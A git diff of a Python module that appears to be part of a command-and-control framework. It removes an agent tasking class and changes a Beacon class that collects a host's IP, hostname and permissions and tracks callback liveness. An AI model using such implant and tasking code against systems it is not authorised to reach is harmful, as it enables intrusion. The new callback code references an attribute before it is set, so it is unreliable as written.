@@ -1,44 +1,19 @@
-import os
 import subprocess
 import re
 import socket
-import uuid
 import requests
-from database import Beacon as BeaconDB, Task as TaskDB, db
-
-class Agent:
-    def __init__(self, name, id, key, path, config):
-        self.name = name
-        self.id = id
-        self.key = key
-        self.path = path
-        self.config = config
-
-    def fetch_tasks(self, beacon_id):
-        """Fetch tasks from the database for a specific beacon."""
-        tasks = TaskDB.query.filter_by(beacon_id=beacon_id).all()
-        return [task.task for task in tasks], 200 if tasks else 204
-
-    def write_task(self, beacon_id, task_content):
-        """Assign a task to a specific beacon."""
-        task_id = str(uuid.uuid4())
-        new_task = TaskDB(
-            task_id=task_id,
-            beacon_id=beacon_id,
-            task=task_content,
-            status="pending"
-        )
-        db.session.add(new_task)
-        db.session.commit()
-        return f"{self.name} has tasked beacon {beacon_id} to execute: {task_content}", 200
+from app.database import Beacon as BeaconDB, db
+import datetime
 
 class Beacon:
-    def __init__(self, agent, beacon_id=None):
+    def __init__(self, agent, beacon_id=None, alive=False):
         self.agent = agent
         self.beacon_id = beacon_id
         self.remote_ip = self.get_ip()[0] if self.get_ip() else "unknown"
-        self.remote_hostname = self.get_hostname()
-        self.remote_permissions = self.get_permissions()[1]  # Only need the permission status
+        self.remote_hostname = self.get_hostname() if self.get_hostname() else "unknown"
+        self.remote_permissions = self.get_permissions()[1]
+        self.alive = alive
+        self.callback = self.next_callback()
 
     def get_ip(self):
         result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
@@ -86,7 +61,6 @@ class Beacon:
             print(f"Error fetching tasks: {response.status_code}")
 
     def write_new_beacon(self):
-        """Write new beacon data to the database."""
         new_beacon = BeaconDB(
             id=self.beacon_id,
             ip=self.remote_ip,
@@ -99,3 +73,20 @@ class Beacon:
             print(f"Beacon {self.beacon_id} saved to the database.")
         except Exception as e:
             print(f"Error saving beacon: {str(e)}")
+
+
+    def next_callback(self):
+        if not self.alive:
+            return
+        
+        if not self.callback:
+            self.callback = datetime.datetime.utcnow() + datetime.timedelta(seconds=30)
+            db.session.commit()
+        else:
+            diff = self.callback - datetime.datetime.utcnow()
+            if diff.total_seconds() <= 0:
+                print(f"Beacon {self.beacon_id} is not responding, marking as dead")
+                self.alive = False
+                db.session.commit()
+            else:
+                print(f"Beacon {self.beacon_id} is alive, next callback in {diff.total_seconds()} seconds")
